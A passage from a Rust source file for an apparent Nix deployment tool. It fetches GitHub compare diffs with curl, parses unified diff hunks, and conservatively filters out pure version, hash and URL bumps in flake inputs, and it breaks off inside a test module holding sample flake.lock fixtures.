        .any(|b| b.is_ascii_control() || b.is_ascii_whitespace() || b == b'"' || b == b'\\')
    {
        return None;
    }
    Some(trimmed.to_string())
}

fn is_safe_path_segment(seg: &str) -> bool {
    !seg.is_empty()
        && seg != "."
        && seg != ".."
        && seg
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.'))
}

/// Execute a GitHub API GET request via `curl`, returning `(http_status, response_body)`.
fn curl_github_json(url: &str, token: Option<&str>) -> Result<(u16, String)> {
    let mut cmd = Command::new("curl");
    cmd.args([
        "-sSL",
        "--max-time",
        "20",
        "-H",
        "Accept: application/vnd.github.v3+json",
        "-H",
        "User-Agent: nix-deploy",
        "-w",
        "\n%{http_code}",
    ]);

    // Pass Authorization via stdin (`-K -`) rather than argv so the token does not
    // appear in process listings (`/proc/<pid>/cmdline`).
    if token.is_some() {
        cmd.args(["-K", "-"]);
        cmd.stdin(Stdio::piped());
    } else {
        cmd.stdin(Stdio::null());
    }
    cmd.arg(url).stdout(Stdio::piped()).stderr(Stdio::piped());

    let mut child = cmd.spawn().context("spawning curl")?;
    if let (Some(tok), Some(mut stdin)) = (token, child.stdin.take()) {
        let _ = writeln!(stdin, "header = \"Authorization: Bearer {tok}\"");
    }

    let output = child.wait_with_output().context("waiting for curl")?;
    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let detail = stderr.trim();
        if detail.is_empty() {
            bail!("curl exited with {}", output.status);
        }
        bail!("curl exited with {}: {detail}", output.status);
    }

    let raw = String::from_utf8_lossy(&output.stdout);
    let (body, status_str) = raw
        .rsplit_once('\n')
        .context("unexpected curl output without HTTP status line")?;
    let status: u16 = status_str
        .trim()
        .parse()
        .with_context(|| format!("invalid HTTP status {status_str:?}"))?;
    Ok((status, body.to_string()))
}

fn empty_error_diff(change: &InputChange, error: String) -> InputDiff {
    InputDiff {
        change: change.clone(),
        commits: Vec::new(),
        files: Vec::new(),
        hidden_files: 0,
        hidden_hunks: 0,
        substantive_files: 0,
        collapsed_too_large: false,
        error: Some(error),
    }
}

/// Parse a GitHub Compare API JSON response into a filtered [`InputDiff`].
fn build_input_diff_from_github_json(
    change: &InputChange,
    json: &str,
    cfg: &DiffConfig,
) -> Result<InputDiff> {
    let parsed: GhCompareResponse =
        serde_json::from_str(json).context("decoding GitHub compare JSON")?;

    let commits: Vec<CommitInfo> = parsed
        .commits
        .into_iter()
        .map(|c| {
            let subject = c
                .commit
                .message
                .lines()
                .next()
                .unwrap_or("")
                .trim()
                .to_string();
            let author = c
                .commit
                .author
                .and_then(|a| a.name)
                .filter(|n| !n.is_empty())
                .unwrap_or_else(|| "unknown".to_string());
            CommitInfo {
                sha: c.sha,
                subject,
                author,
            }
        })
        .collect();

    let truncated_by_github = parsed.files.len() >= GITHUB_COMPARE_FILE_LIMIT;
    let files: Vec<DiffFile> = parsed
        .files
        .into_iter()
        .map(|f| {
            let (hunks, no_patch_reason) = match f.patch {
                Some(ref patch) if !patch.is_empty() => {
                    let mut hunks = parse_patch(patch);
                    for hunk in &mut hunks {
                        hunk.is_pure_bump = is_pure_version_or_hash_hunk(&f.filename, hunk);
                    }
                    (hunks, None)
                }
                _ => {
                    let reason = if f.status == "renamed" && f.additions == 0 && f.deletions == 0 {
                        "renamed without content changes".to_string()
                    } else {
                        "patch omitted by GitHub (binary or too large)".to_string()
                    };
                    (Vec::new(), Some(reason))
                }
            };

            let hidden_hunks = hunks.iter().filter(|h| h.is_pure_bump).count();
            let is_filtered = !hunks.is_empty() && hunks.iter().all(|h| h.is_pure_bump);

            DiffFile {
                path: f.filename,
                status: f.status,
                additions: f.additions,
                deletions: f.deletions,
                hunks,
                no_patch_reason,
                is_filtered,
                hidden_hunks,
            }
        })
        .collect();

    let hidden_files = files.iter().filter(|f| f.is_filtered).count();
    let hidden_hunks = files.iter().map(|f| f.hidden_hunks).sum();
    let substantive_files = files.iter().filter(|f| !f.is_filtered).count();
    let collapsed_too_large = substantive_files > cfg.max_diff_files;
    let error = truncated_by_github.then(|| {
        format!(
            "GitHub API truncated file list at {GITHUB_COMPARE_FILE_LIMIT} files; \
             open compare URL for full diff"
        )
    });

    Ok(InputDiff {
        change: change.clone(),
        commits,
        files,
        hidden_files,
        hidden_hunks,
        substantive_files,
        collapsed_too_large,
        error,
    })
}

// ---------------------------------------------------------------------------
// Unified diff parsing & conservative pure version/hash bump filter
// ---------------------------------------------------------------------------

/// Parse a unified diff patch string (such as GitHub's `file.patch`) into hunks.
///
/// Each returned [`DiffHunk`] starts with `is_pure_bump = false`; call
/// [`is_pure_version_or_hash_hunk`] to classify each hunk in the context of its file path.
///
/// # Arguments
///
/// * `patch` - Unified diff text containing one or more `@@ ... @@` hunks
///
/// # Returns
///
/// Parsed list of [`DiffHunk`] values.
pub fn parse_patch(patch: &str) -> Vec<DiffHunk> {
    let mut hunks = Vec::new();
    let mut current: Option<DiffHunk> = None;

    for line in patch.lines() {
        if line.starts_with("@@") {
            if let Some(prev) = current.take() {
                hunks.push(prev);
            }
            current = Some(DiffHunk {
                header: line.to_string(),
                lines: Vec::new(),
                is_pure_bump: false,
            });
            continue;
        }

        let Some(hunk) = current.as_mut() else {
            continue;
        };

        if let Some(rest) = line.strip_prefix('+') {
            hunk.lines.push(DiffLine {
                kind: DiffLineKind::Added,
                text: rest.to_string(),
            });
        } else if let Some(rest) = line.strip_prefix('-') {
            hunk.lines.push(DiffLine {
                kind: DiffLineKind::Removed,
                text: rest.to_string(),
            });
        } else if let Some(rest) = line.strip_prefix(' ') {
            hunk.lines.push(DiffLine {
                kind: DiffLineKind::Context,
                text: rest.to_string(),
            });
        } else if line.is_empty() {
            hunk.lines.push(DiffLine {
                kind: DiffLineKind::Context,
                text: String::new(),
            });
        } else if line.starts_with('\\') {
            hunk.lines.push(DiffLine {
                kind: DiffLineKind::Context,
                text: line.to_string(),
            });
        }
    }

    if let Some(last) = current {
        hunks.push(last);
    }

    hunks
}

/// Conservatively classify whether a unified diff hunk contains ONLY pure
/// version, hash, rev, timestamp, checksum, or same-repo URL-version bumps.
///
/// Returns `false` when the hunk has no added/removed lines, belongs to a `.patch`
/// or `.diff` file, alters code/logic/hooks/imports, introduces unpaired URLs,
/// changes a URL's scheme/host/owner/repo, or is in any way ambiguous.
///
/// # Arguments
///
/// * `path` - Repository-relative path of the modified file
/// * `hunk` - Parsed unified diff hunk to evaluate
///
/// # Returns
///
/// `true` only when every added and removed line is provably a pure bump.
pub fn is_pure_version_or_hash_hunk(path: &str, hunk: &DiffHunk) -> bool {
    let lower_path = path.to_ascii_lowercase();
    if lower_path.ends_with(".patch") || lower_path.ends_with(".diff") {
        return false;
    }

    let mut removed_urls: Vec<(Option<String>, String)> = Vec::new();
    let mut added_urls: Vec<(Option<String>, String)> = Vec::new();
    let mut changed_count: usize = 0;

    for line in &hunk.lines {
        match line.kind {
            DiffLineKind::Context => continue,
            DiffLineKind::Added | DiffLineKind::Removed => {
                changed_count += 1;
                match classify_changed_line(&line.text) {
                    LineBumpKind::PureScalar => {}
                    LineBumpKind::Url { key, url } => {
                        if line.kind == DiffLineKind::Removed {
                            removed_urls.push((key, url));
                        } else {
                            added_urls.push((key, url));
                        }
                    }
                    LineBumpKind::Substantive => return false,
                }
            }
        }
    }

    if changed_count == 0 {
        return false;
    }

    // URL changes MUST be paired 1-to-1 with identical key, scheme, host, and repo path.
    if removed_urls.len() != added_urls.len() {
        return false;
    }
    for ((old_key, old_url), (new_key, new_url)) in removed_urls.iter().zip(added_urls.iter()) {
        if old_key != new_key || !is_pure_url_version_bump(old_url, new_url) {
            return false;
        }
    }

    true
}

#[derive(Debug, PartialEq, Eq)]
enum LineBumpKind {
    PureScalar,
    Url { key: Option<String>, url: String },
    Substantive,
}

fn classify_changed_line(raw: &str) -> LineBumpKind {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return LineBumpKind::Substantive;
    }
    // Reject Nix string interpolations, command substitutions, or shell pipelines anywhere.
    if trimmed.contains("${")
        || trimmed.contains("$(")
        || trimmed.contains('`')
        || trimmed.contains('|')
        || trimmed.contains('&')
    {
        return LineBumpKind::Substantive;
    }

    // Strip at most one trailing `,` or `;`.
    let body = trimmed
        .strip_suffix(';')
        .or_else(|| trimmed.strip_suffix(','))
        .unwrap_or(trimmed)
        .trim();

    if body.is_empty() {
        return LineBumpKind::Substantive;
    }

    // Case 1: Standalone quoted literal (e.g. inside an array of hashes or URLs).
    if let Some(val) = unquote_strict(body) {
        if is_unambiguous_hash(val) {
            return LineBumpKind::PureScalar;
        }
        if is_http_url(val) {
            return LineBumpKind::Url {
                key: None,
                url: val.to_string(),
            };
        }
        return LineBumpKind::Substantive;
    }

    // Case 2: Key-value assignment (`key = value`, `"key": value`, `key: value`).
    let Some((key, val_raw)) = split_key_value(body) else {
        return LineBumpKind::Substantive;
    };

    if let Some(url) = unquote_strict(val_raw).filter(|v| is_http_url(v)) {
        if is_url_key(key) {
            return LineBumpKind::Url {
                key: Some(key.to_string()),
                url: url.to_string(),
            };
        }
        return LineBumpKind::Substantive;
    }

    if is_pure_key_value(key, val_raw) {
        LineBumpKind::PureScalar
    } else {
        LineBumpKind::Substantive
    }
}

/// Split a single-line key-value assignment in Nix, JSON, TOML, or YAML syntax.
fn split_key_value(body: &str) -> Option<(&str, &str)> {
    // Try `=` first (Nix / TOML) unless a `:` appears earlier outside quotes (JSON / YAML).
    let (raw_key, raw_val) = if let Some(rest) = body.strip_prefix('"') {
        let end_quote = rest.find('"')?;
        let key = &rest[..end_quote];
        let after = rest[end_quote + 1..].trim_start();
        let val = after
            .strip_prefix(':')
            .or_else(|| after.strip_prefix('='))?
            .trim();
        (key, val)
    } else {
        let eq_pos = body.find('=');
        let colon_pos = body.find(':');
        let sep_pos = match (eq_pos, colon_pos) {
            (Some(e), Some(c)) => e.min(c),
            (Some(e), None) => e,
            (None, Some(c)) => c,
            (None, None) => return None,
        };
        let key = body[..sep_pos].trim();
        let val = body[sep_pos + 1..].trim();
        (key, val)
    };

    // Guard against `==` comparisons or `::` paths being misparsed as assignments.
    if raw_val.starts_with('=')
        || raw_val.starts_with(':')
        || raw_key.is_empty()
        || raw_val.is_empty()
    {
        return None;
    }

    // Keys must be simple identifiers (no whitespace, function calls, or expressions).
    let key = raw_key
        .strip_prefix('\'')
        .and_then(|s| s.strip_suffix('\''))
        .unwrap_or(raw_key);
    if key.is_empty()
        || !key
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-' | b'.'))
    {
        return None;
    }

    Some((key, raw_val))
}

/// Unquote a strict double-quoted or single-quoted scalar string containing no inner quotes.
fn unquote_strict(s: &str) -> Option<&str> {
    if let Some(inner) = s.strip_prefix('"').and_then(|x| x.strip_suffix('"')) {
        if inner.contains('"') || inner.contains('\\') {
            return None;
        }
        return Some(inner);
    }
    if let Some(inner) = s.strip_prefix('\'').and_then(|x| x.strip_suffix('\'')) {
        if inner.contains('\'') || inner.contains('\\') {
            return None;
        }
        return Some(inner);
    }
    None
}

fn is_url_key(key: &str) -> bool {
    let lower = key.to_ascii_lowercase();
    matches!(
        lower.as_str(),
        "url" | "src" | "source" | "tarball" | "download_url" | "downloadurl" | "archive_url"
    ) || lower.ends_with("_url")
        || lower.ends_with("url")
}

fn is_pure_key_value(key: &str, val_raw: &str) -> bool {
    let lower = key.to_ascii_lowercase();

    // Bare integer values are allowed only for timestamp/count/revision-number keys.
    if val_raw.bytes().all(|b| b.is_ascii_digit()) {
        return is_timestamp_or_count_key(&lower);
    }

    let Some(val) = unquote_strict(val_raw) else {
        return false;
    };
    if val.is_empty() {
        return false;
    }

    if is_hash_key(&lower) {
        return is_hash_value(val);
    }

    if is_rev_key(&lower) {
        return is_hex_rev(val) || is_version_string(val);
    }

    if matches!(lower.as_str(), "tag" | "ref") {
        let stripped = val.strip_prefix("refs/tags/").unwrap_or(val);
        return is_hex_rev(stripped) || is_version_string(stripped);
    }

    if is_version_key(&lower) {
        return is_version_string(val) || is_iso_date(val);
    }

    if is_timestamp_or_count_key(&lower) {
        return is_iso_date(val) || val.bytes().all(|b| b.is_ascii_digit());
    }

    // Per-platform hash tables (e.g. `x86_64-linux = "sha256-...";`) have arbitrary
    // architecture keys, so allow any simple key when the value is an unambiguous hash.
    is_unambiguous_hash(val)
}

fn is_hash_key(lower: &str) -> bool {
    matches!(
        lower,
        "hash"
            | "sha256"
            | "sha512"
            | "sha384"
            | "sha1"
            | "md5"
            | "narhash"
            | "outputhash"
            | "cargohash"
            | "vendorhash"
            | "srchash"
            | "npmdepshash"
            | "pnpmdepshash"
            | "yarnhash"
            | "nugetdepshash"
            | "checksum"
            | "digest"
            | "integrity"
    ) || lower.ends_with("_hash")
        || lower.ends_with("hash")
        || lower.ends_with("_sha256")
        || lower.ends_with("_sha512")
}

fn is_rev_key(lower: &str) -> bool {
    matches!(lower, "rev" | "commit" | "revision" | "git_rev" | "gitrev")
}

fn is_version_key(lower: &str) -> bool {
    matches!(
        lower,
        "version" | "ver" | "release" | "pkgver" | "pkgrel" | "suffix"
    ) || lower.ends_with("_version")
        || lower.ends_with("version")
}

fn is_timestamp_or_count_key(lower: &str) -> bool {
    matches!(
        lower,
        "lastmodified"
            | "last_modified"
            | "revcount"
            | "rev_count"
            | "timestamp"
            | "date"
            | "releasedate"
            | "release_date"
            | "builddate"
            | "build_date"
            | "updated"
            | "epoch"
    )
}

fn is_unambiguous_hash(val: &str) -> bool {
    static SRI_RE: OnceLock<Regex> = OnceLock::new();
    let sri = SRI_RE.get_or_init(|| {
        Regex::new(r"^(?:sha256|sha512|sha384|sha1)-[A-Za-z0-9+/]{24,}={0,2}$")
            .expect("valid SRI regex")
    });
    if sri.is_match(val) {
        return true;
    }
    matches!(val.len(), 40 | 64 | 128) && val.bytes().all(|b| b.is_ascii_hexdigit())
}

fn is_hash_value(val: &str) -> bool {
    if is_unambiguous_hash(val) {
        return true;
    }
    static PREFIXED_RE: OnceLock<Regex> = OnceLock::new();
    let prefixed = PREFIXED_RE.get_or_init(|| {
        Regex::new(r"^(?:sha256|sha512|sha384|sha1):[0-9A-Za-z+/=_-]{32,128}$")
            .expect("valid prefixed hash regex")
    });
    if prefixed.is_match(val) {
        return true;
    }
    // 32-char hex (MD5) or 52/103-char Nix base32 sha256/sha512.
    if val.len() == 32 && val.bytes().all(|b| b.is_ascii_hexdigit()) {
        return true;
    }
    is_nix_base32_hash(val)
}

fn is_nix_base32_hash(val: &str) -> bool {
    matches!(val.len(), 52 | 103)
        && val.bytes().all(|b| {
            matches!(
                b,
                b'0'..=b'9'
                    | b'a'..=b'd'
                    | b'f'..=b'n'
                    | b'p'..=b's'
                    | b'v'..=b'z'
            )
        })
}

fn is_hex_rev(val: &str) -> bool {
    matches!(val.len(), 40 | 64) && val.bytes().all(|b| b.is_ascii_hexdigit())
}

fn is_version_string(val: &str) -> bool {
    static VERSION_RE: OnceLock<Regex> = OnceLock::new();
    let re = VERSION_RE.get_or_init(|| {
        Regex::new(r"^(?:[A-Za-z]{1,12}[-_]?)?[0-9]+(?:[._+-][A-Za-z0-9]+)*$")
            .expect("valid version regex")
    });
    val.len() <= 96 && re.is_match(val)
}

fn is_iso_date(val: &str) -> bool {
    static DATE_RE: OnceLock<Regex> = OnceLock::new();
    let re = DATE_RE.get_or_init(|| {
        Regex::new(
            r"^[0-9]{4}-[0-9]{2}-[0-9]{2}(?:[T ][0-9]{2}:[0-9]{2}:[0-9]{2}(?:\.[0-9]+)?(?:Z|[+-][0-9]{2}:?[0-9]{2})?)?$",
        )
        .expect("valid ISO date regex")
    });
    re.is_match(val)
}

fn is_http_url(val: &str) -> bool {
    val.starts_with("https://") || val.starts_with("http://")
}

/// Split an `http://` or `https://` URL into `(scheme, authority, path_and_query)`.
fn split_http_url(url: &str) -> Option<(&str, &str, &str)> {
    let (scheme, rest) = if let Some(rest) = url.strip_prefix("https://") {
        ("https", rest)
    } else {
        ("http", url.strip_prefix("http://")?)
    };
    let (authority, path) = match rest.find('/') {
        Some(idx) => (&rest[..idx], &rest[idx..]),
        None => (rest, ""),
    };
    if authority.is_empty() {
        return None;
    }
    Some((scheme, authority, path))
}

/// Return `true` only when `old_url` and `new_url` share identical scheme, host,
/// repository identity, and path structure, differing solely in version/hash/rev/UUID tokens.
fn is_pure_url_version_bump(old_url: &str, new_url: &str) -> bool {
    if old_url == new_url {
        return true;
    }
    for url in [old_url, new_url] {
        if url.bytes().any(|b| {
            b.is_ascii_whitespace()
                || b.is_ascii_control()
                || matches!(
                    b,
                    b'@' | b'\\' | b'<' | b'>' | b';' | b'|' | b'&' | b'`' | b'$'
                )
        }) {
            return false;
        }
        if url.contains("..") {
            return false;
        }
    }

    let (Some((old_scheme, old_auth, old_rest)), Some((new_scheme, new_auth, new_rest))) =
        (split_http_url(old_url), split_http_url(new_url))
    else {
        return false;
    };

    // Never allow protocol downgrades (https -> http) or host/port changes.
    if old_scheme != new_scheme || old_auth != new_auth {
        return false;
    }

    // Split off query/fragment; any difference in query or fragment is substantive.
    let (old_path, old_tail) = split_path_and_tail(old_rest);
    let (new_path, new_tail) = split_path_and_tail(new_rest);
    if old_tail != new_tail {
        return false;
    }

    let old_segs: Vec<&str> = old_path.split('/').filter(|s| !s.is_empty()).collect();
    let new_segs: Vec<&str> = new_path.split('/').filter(|s| !s.is_empty()).collect();
    if old_segs.len() != new_segs.len() || old_segs.is_empty() {
        return false;
    }

    // Pin the host-specific owner/repo prefix segments so changing repository owner
    // or name is never mistaken for a version bump.
    let locked_prefix_len = immutable_url_prefix_len(old_auth, &old_segs);
    if old_segs.len() < locked_prefix_len {
        return false;
    }
    if old_segs[..locked_prefix_len] != new_segs[..locked_prefix_len] {
        return false;
    }

    let mut any_diff = false;
    for (old_seg, new_seg) in old_segs[locked_prefix_len..]
        .iter()
        .zip(new_segs[locked_prefix_len..].iter())
    {
        if old_seg == new_seg {
            continue;
        }
        any_diff = true;
        if !is_url_segment_version_bump(old_seg, new_seg) {
            return false;
        }
    }

    any_diff
}

fn split_path_and_tail(rest: &str) -> (&str, &str) {
    match rest.find(['?', '#']) {
        Some(idx) => (&rest[..idx], &rest[idx..]),
        None => (rest, ""),
    }
}

fn immutable_url_prefix_len(authority: &str, segs: &[&str]) -> usize {
    let host = authority.split(':').next().unwrap_or(authority);
    if host.eq_ignore_ascii_case("github.com")
        || host.eq_ignore_ascii_case("raw.githubusercontent.com")
        || host.eq_ignore_ascii_case("codeload.github.com")
        || host.eq_ignore_ascii_case("gitlab.com")
        || host.eq_ignore_ascii_case("codeberg.org")
        || host.eq_ignore_ascii_case("bitbucket.org")
        || host.eq_ignore_ascii_case("git.sr.ht")
    {
        return 2;
    }
    if host.eq_ignore_ascii_case("api.github.com") && segs.first() == Some(&"repos") {
        return 3;
    }
    if host.eq_ignore_ascii_case("api.flakehub.com") || host.eq_ignore_ascii_case("flakehub.com") {
        return match segs {
            ["f", "pinned", ..] => 4,
            ["f", ..] => 3,
            _ => 1,
        };
    }
    if segs.len() > 1 {
        1
    } else {
        0
    }
}

fn is_url_segment_version_bump(old_seg: &str, new_seg: &str) -> bool {
    if is_pure_url_token(old_seg) && is_pure_url_token(new_seg) {
        return true;
    }
    let (old_skel, old_changed) = url_segment_skeleton(old_seg);
    let (new_skel, new_changed) = url_segment_skeleton(new_seg);
    old_changed && new_changed && old_skel == new_skel
}

fn is_pure_url_token(seg: &str) -> bool {
    static UUID_RE: OnceLock<Regex> = OnceLock::new();
    static FLAKEHUB_VER_RE: OnceLock<Regex> = OnceLock::new();
    static SHORT_HEX_RE: OnceLock<Regex> = OnceLock::new();

    let uuid = UUID_RE.get_or_init(|| {
        Regex::new(r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$")
            .expect("valid UUID regex")
    });
    if uuid.is_match(seg) {
        return true;
    }

    let flakehub = FLAKEHUB_VER_RE.get_or_init(|| {
        Regex::new(r"^[0-9]+(?:\.[0-9]+)+(?:%2[Bb]|\+)rev-[0-9a-fA-F]{7,64}$")
            .expect("valid FlakeHub version regex")
    });
    if flakehub.is_match(seg) {
        return true;
    }

    if is_hex_rev(seg) || is_iso_date(seg) || is_dotted_version_token(seg) {
        return true;
    }

    // Pure numeric release/build IDs (e.g. `12345` -> `12346`).
    if !seg.is_empty() && seg.bytes().all(|b| b.is_ascii_digit()) {
        return true;
    }

    // Short git SHA (7..=39 hex chars) must contain at least one digit so plain
    // words like `deadbeef` or `facade` are not misclassified.
    let short_hex = SHORT_HEX_RE
        .get_or_init(|| Regex::new(r"^[0-9a-fA-F]{7,39}$").expect("valid short hex regex"));
    short_hex.is_match(seg) && seg.bytes().any(|b| b.is_ascii_digit())
}

fn is_dotted_version_token(seg: &str) -> bool {
    static DOTTED_RE: OnceLock<Regex> = OnceLock::new();
    let re = DOTTED_RE.get_or_init(|| {
        Regex::new(
            r"^[vVrR]?[0-9]+(?:\.[0-9]+)+(?:[-._+](?:rc|alpha|beta|pre|dev|post|r)?[0-9]+)*$",
        )
        .expect("valid dotted version regex")
    });
    re.is_match(seg)
}

/// Replace embedded UUIDs, FlakeHub revisions, long hex hashes, ISO dates, and
/// dotted versions inside a filename/path segment with fixed placeholders.
fn url_segment_skeleton(seg: &str) -> (String, bool) {
    static UUID_RE: OnceLock<Regex> = OnceLock::new();
    static FH_REV_RE: OnceLock<Regex> = OnceLock::new();
    static HEX_RE: OnceLock<Regex> = OnceLock::new();
    static DATE_RE: OnceLock<Regex> = OnceLock::new();
    static VER_RE: OnceLock<Regex> = OnceLock::new();

    let uuid = UUID_RE.get_or_init(|| {
        Regex::new(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")
            .expect("valid UUID regex")
    });
    let fh_rev = FH_REV_RE.get_or_init(|| {
        Regex::new(r"(?:%2[Bb]|\+)rev-[0-9a-fA-F]{7,64}").expect("valid FlakeHub rev regex")
    });
    let hex =
        HEX_RE.get_or_init(|| Regex::new(r"[0-9a-fA-F]{32,64}").expect("valid long hex regex"));
    let date = DATE_RE
        .get_or_init(|| Regex::new(r"[0-9]{4}-[0-9]{2}-[0-9]{2}").expect("valid date regex"));
    let ver = VER_RE.get_or_init(|| {
        Regex::new(
            r"[0-9]+(?:\.[0-9]+)+(?:-(?:rc|alpha|beta|pre|dev|post)\.?[0-9]*|-r[0-9]+|-[0-9]+)?",
        )
        .expect("valid embedded version regex")
    });

    let mut replaced = false;
    let mut current = seg.to_string();
    for (re, placeholder) in [
        (uuid, "<UUID>"),
        (fh_rev, "<REV>"),
        (hex, "<HASH>"),
        (date, "<DATE>"),
        (ver, "<VER>"),
    ] {
        let next = re.replace_all(&current, placeholder);
        if next != current {
            replaced = true;
            current = next.into_owned();
        }
    }
    (current, replaced)
}

#[cfg(test)]
mod tests {
    use super::*;

    const SAMPLE_OLD_LOCK: &str = r#"{
  "nodes": {
    "root": {
      "inputs": {
        "nixpkgs": "nixpkgs_3",
        "nixpkgs-fast": "nixpkgs-fast",
        "home-manager": "home-manager",
        "nix-darwin": "nix-darwin",
        "nix-cachyos-kernel": "nix-cachyos-kernel",
        "crane": "crane",
        "dessplay": "dessplay"
      }
    },
    "nixpkgs_3": {
      "locked": {
        "lastModified": 1794042290,
        "narHash": "sha256-ziZn2PvCJE5JEEpqTdxXwJpPB+L3YqoCpTAMCzyaP3U=",
        "rev": "f4a03c008967841f2a0b3cb7c436fc6fc31671f6",
        "revCount": 1113206,
        "type": "tarball",
        "url": "https://api.flakehub.com/f/pinned/DeterminateSystems/nixpkgs-weekly/0.1.1113206%2Brev-f4a03c008967841f2a0b3cb7c436fc6fc31671f6/01a1e7ff-6305-7ad2-bb1f-9855526cb446/source.tar.gz"
      },
      "original": {
        "type": "tarball",
        "url": "https://flakehub.com/f/DeterminateSystems/nixpkgs-weekly/0.1"
      }
    },
    "nixpkgs-fast": {
      "locked": {
        "lastModified": 1794890597,
        "narHash": "sha256-lME2lHoDHAaSHP3/okgiVoJ0icVEvsQH8LeU3We7tcc=",
        "owner": "NixOS",
        "repo": "nixpkgs",
        "rev": "04906337b6d53e8bb0eaf0470ae9f070a4d4eb55",
        "type": "github"
      }
    },
    "home-manager": {
      "locked": {
        "lastModified": 1794963576,
        "narHash": "sha256-+CPrP74GDJ63f7bgEFC9Av4hbxc7K9WUNv1ZVRifRe8=",
        "owner": "nix-community",
        "repo": "home-manager",
        "rev": "2b13c9cb3aa20653e6f8ee0b7f8331a53ea9b0a9",
        "type": "github"
      }
    },
    "nix-darwin": {
      "locked": {
        "lastModified": 1793418699,
        "narHash": "sha256-+RpTlcdh9KqZ+ZiLkNSTvibQWm935EcIdBzRPCTFsrQ=",
        "owner": "nix-darwin",
        "repo": "nix-darwin",
        "rev": "ff0e21a414d4547183396da1b44a66f2577b65e9",
        "type": "github"
      }
    },
    "nix-cachyos-kernel": {
      "locked": {
        "lastModified": 1795044798,
        "narHash": "sha256-Bkbyx8jdSe/tDSac0CMxcXY+SkVSEHcwhvCpgkb4qWU=",
        "owner": "xddxdd",
        "repo": "nix-cachyos-kernel",
        "rev": "10e8df08ad828225575f448e6b49ae092132d9a8",
        "type": "github"
      }
    },
    "crane": {
      "locked": {
        "lastModified": 1794962885,
        "narHash": "sha256-zrweT2tXbcWiJMACOhOr2eYFJKVa6g59ouRaZ3BS5Do=",
        "owner": "ipetkov",
        "repo": "crane",
        "rev": "95e62def851e9d650f0eab63cb4f59a3306e20bd",
        "type": "github"
      }
    },
    "crane_2": {
      "locked": {
        "lastModified": 1794962885,
        "narHash": "sha256-zrweT2tXbcWiJMACOhOr2eYFJKVa6g59ouRaZ3BS5Do=",
        "owner": "ipetkov",
        "repo": "crane",
        "rev": "95e62def851e9d650f0eab63cb4f59a3306e20bd",
        "type": "github"
      }
    },
    "nixpkgs-lib": {
      "locked": {
        "lastModified": 1793504054,
        "narHash": "sha256-ThkfL3D/FhCiZFc9+3BtxwuMmpuK+/bGtXCSo1+yVew=",
        "owner": "nix-community",
        "repo": "nixpkgs.lib",
        "rev": "7851ba61fd862b277cb6a9cef37394bc18bb94e4",
        "type": "github"
      }
    },
    "flake-parts": {
      "locked": {
        "lastModified": 1793576659,
        "narHash": "sha256-V1h85lUaJBQoHFrB2vpXZOE0Ju1MYSnIpsehoVZYlDo=",
        "owner": "hercules-ci",
        "repo": "flake-parts",
        "rev": "ea2630b7470978622c7689a1ff75d2b389175399",
        "type": "github"
      }
    },
    "dessplay": {
      "locked": {
        "lastModified": 1793921315,
        "narHash": "sha256-so1yf65S8fSp/C6ND8ynyrH18EYKFoBuXoSAekk21JA=",
        "owner": "baughn",
        "repo": "dessplay",
        "rev": "a3713199aa447d34d47b437bc20b51dfbbb4099e",
        "type": "github"
      }
    }
  },
  "root": "root",
  "version": 7
}"#;

    const SAMPLE_NEW_LOCK: &str = r#"{
  "nodes": {
    "root": {
      "inputs": {
        "nixpkgs": "nixpkgs_3",
        "nixpkgs-fast": "nixpkgs-fast",
        "home-manager": "home-manager",
        "nix-darwin": "nix-darwin",
        "nix-cachyos-kernel": "nix-cachyos-kernel",
        "crane": "crane",
        "dessplay": "dessplay"
      }
    },
    "nixpkgs_3": {
      "locked": {
        "lastModified": 1794647090,
        "narHash": "sha256-NEWNARHASH111111111111111111111111111111111=",
        "rev": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
        "revCount": 1114000,
        "type": "tarball",
        "url": "https://api.flakehub.com/f/pinned/DeterminateSystems/nixpkgs-weekly/0.1.1114000%2Brev-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/01a2f800-7416-8be3-cc20-0966637dc557/source.tar.gz"
      },
      "original": {
        "type": "tarball",
        "url": "https://flakehub.com/f/DeterminateSystems/nixpkgs-weekly/0.1"
      }
    },
    "nixpkgs-fast": {
      "locked": {
        "lastModified": 1795000000,
        "narHash": "sha256-NEWFASTHASH11111111111111111111111111111111=",
        "owner": "NixOS",
        "repo": "nixpkgs",
        "rev": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
        "type": "github"
      }
    },
    "home-manager": {
      "locked": {
        "lastModified": 1795000100,
        "narHash": "sha256-NEWHM11111111111111111111111111111111111111=",
        "owner": "nix-community",
        "repo": "home-manager",
        "rev": "cccccccccccccccccccccccccccccccccccccccc",
        "type": "github"
      }
    },
    "nix-darwin": {
      "locked": {
        "lastModified": 1793418699,
        "narHash": "sha256-+RpTlcdh9KqZ+ZiLkNSTvibQWm935EcIdBzRPCTFsrQ=",
        "owner": "nix-darwin",
        "repo": "nix-darwin",
        "rev": "ff0e21a414d4547183396da1b44a66f2577b65e9",
        "type": "github"
      }
    },
    "nix-cachyos-kernel": {
      "locked": {
        "lastModified": 1795100000,
        "narHash": "sha256-NEWCACHY11111111111111111111111111111111111=",
        "owner": "xddxdd",
        "repo": "nix-cachyos-kernel",
        "rev": "dddddddddddddddddddddddddddddddddddddddd",
        "type": "github"
      }
    },
    "crane": {
      "locked": {
        "lastModified": 1795100200,
        "narHash": "sha256-NEWCRANE11111111111111111111111111111111111=",
        "owner": "ipetkov",
        "repo": "crane",
        "rev": "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
        "type": "github"
      }
    },
    "crane_2": {
      "locked": {
        "lastModified": 1795100200,
        "narHash": "sha256-NEWCRANE11111111111111111111111111111111111=",
        "owner": "ipetkov",
        "repo": "crane",
        "rev": "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
        "type": "github"
      }
    },
    "nixpkgs-lib": {
